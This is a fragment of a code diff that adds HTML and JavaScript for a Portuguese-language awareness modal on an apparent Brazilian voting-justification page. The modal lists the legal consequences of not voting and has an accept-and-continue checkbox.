+          <li style="margin-bottom: 6px;">❌ Praticar qualquer ato para o qual se exija quitação do serviço militar ou imposto de renda.</li>
+          <li style="margin-bottom: 6px;">❌ Obter certidão de quitação eleitoral para fins de instrução de registro de candidatura.</li>
+          <li style="margin-bottom: 6px;">❌ Obter certidão de regularidade do exercício do voto, justificativa ou pagamento da multa no último turno da última eleição ou de regularidade do comparecimento às urnas ou do pagamento da multa pela ausência e do atendimento às convocações para os trabalhos eleitorais.</li>
+          <li style="margin-bottom: 6px;">❌ Obter qualquer documento perante repartições diplomáticas a que a pessoa estiver subordinada.</li>
+        </ul>
+
+        <p style="margin: 12px 0; font-style: italic; color: #555;"><strong>Cancelamento de inscrição:</strong> Será cancelada a inscrição da eleitora ou do eleitor que não votar em três eleições consecutivas (sendo cada turno considerado uma eleição), não justificar a ausência e não pagar a multa devida, a contar da data do último pleito a que deveria ter comparecido.</p>
+      </div>
+
+      <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
+        <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px; cursor: pointer;">
+          <input type="checkbox" id="checkboxAceitar" style="width: 18px; height: 18px; cursor: pointer;">
+          <span style="font-size: 12px; color: #333;">Li e entendi as informações acima. Desejo continuar com a justificativa de voto.</span>
+        </label>
+
+        <div style="display: flex; gap: 10px; justify-content: flex-end;">
+          <button id="btnCancelar" style="padding: 10px 20px; border: 1px solid #cbd5e1; background: #f5f5f5; color: #333; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600;">Cancelar</button>
+          <button id="btnAceitar" disabled style="padding: 10px 20px; background: #cbd5e1; color: #999; border: none; border-radius: 6px; cursor: not-allowed; font-size: 13px; font-weight: 600;">Aceitar e Continuar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
+  <script>
+    // Modal de Conscientização
+    const modalConsc = document.getElementById('modalConscientizacao');
+    const checkboxAceitar = document.getElementById('checkboxAceitar');
+    const btnAceitar = document.getElementById('btnAceitar');
+    const btnCancelar = document.getElementById('btnCancelar');
+
+    checkboxAceitar.addEventListener('change', function() {
+      if (this.checked) {
+        btnAceitar.disabled = false;
+        btnAceitar.style.background = '#173058';
+        btnAceitar.style.color = 'white';
+        btnAceitar.style.cursor = 'pointer';
+      } else {
+        btnAceitar.disabled = true;
+        btnAceitar.style.background = '#cbd5e1';
+        btnAceitar.style.color = '#999';
+        btnAceitar.style.cursor = 'not-allowed';
+      }
+    });
+
+    window.mostrarModalConscientizacao = function() {
+      checkboxAceitar.checked = false;
+      btnAceitar.disabled = true;
+      btnAceitar.style.background = '#cbd5e1';
+      btnAceitar.style.color = '#999';
+      modalConsc.style.display = 'flex';
+    };
+
+    window.ocultarModalConscientizacao = function() {
+      modalConsc.style.display = 'none';
+    };
+
+    btnCancelar.addEventListener('click', function() {
+      window.ocultarModalConscientizacao();
+    });
+
+    btnAceitar.addEventListener('click', function() {
+      window.ocultarModalConscientizacao();
+      if (window.continuarGerarComprovante) {
+        window.continuarGerarComprovante();
+      }
+    });
+
+    modalConsc.addEventListener('click', function(e) {
+      if (e.target === this) {
+        window.ocultarModalConscientizacao();
+      }
+    });
+
+    new window.VLibras.Widget('https://vlibras.gov.br/app');
+  </script>
+
+  <!-- Modal de Conscientização -->
+  <div id="modalConscientizacao" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
+    padding: 20px;
+  ">
+    <div style="
+      background: white;
+      border-radius: 12px;
+      max-width: 600px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      padding: 30px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    ">
+      <div style="
+        text-align: center;
+        margin-bottom: 20px;
+        padding-bottom: 20px;
+        border-bottom: 2px solid #173058;
+      ">
+        <h2 style="
+          color: #173058;
+          font-size: 18px;
+          margin: 0;
+          font-weight: 700;
+        ">
+          ⚠️ Guia de Conscientização
+        </h2>
+      </div>
+
+      <div style="
+        font-size: 12px;
+        line-height: 1.6;
+        color: #333;
+        text-align: justify;
+      ">
+        <p style="margin-bottom: 12px;">
+          <strong>Segundo o Código Eleitoral (Lei nº 4.737/1965)</strong>, ao deixar de votar e não apresentar justificativa perante o juiz eleitoral, a pessoa incorre em multa de 3 a 10% do valor do salário-mínimo da região.
+        </p>
+        <p style="margin-bottom: 12px;">
+          Ao deixar de votar, de justificar e de pagar as multas devidas, você fica impedido de: receber salários de empregos públicos, participar de concorrências, renovar matrículas escolares, obter documentos, e muito mais.
+        </p>
+      </div>
+
+      <div style="
+        margin-top: 20px;
+        padding-top: 20px;
+        border-top: 1px solid #e0e0e0;
+      ">
+        <label style="
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          margin-bottom: 15px;
+          cursor: pointer;
+        ">
+          <input
+            type="checkbox"
+            id="checkboxAceitar"
+            style="width: 18px; height: 18px; cursor: pointer;"
+          >
+          <span style="font-size: 12px; color: #333;">
+            Li e entendi as informações. Desejo continuar.
+          </span>
+        </label>
+
+        <div style="
+          display: flex;
+          gap: 10px;
+          justify-content: flex-end;
+        ">
+          <button
+            id="btnCancelar"
+            style="
+              padding: 10px 20px;
+              border: 1px solid #cbd5e1;
+              background: #f5f5f5;
+              color: #333;
+              border-radius: 6px;
+              cursor: pointer;
+              font-size: 13px;
+              font-weight: 600;
+            "
+          >
+            Cancelar
+          </button>
+
+          <button
+            id="btnAceitar"
+            disabled
+            style="
+              padding: 10px 20px;
+              background: #cbd5e1;
+              color: #999;
+              border: none;
+              border-radius: 6px;
+              cursor: not-allowed;
+              font-size: 13px;
+              font-weight: 600;
+            "
+          >
+            Aceitar e Continuar
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
+
+
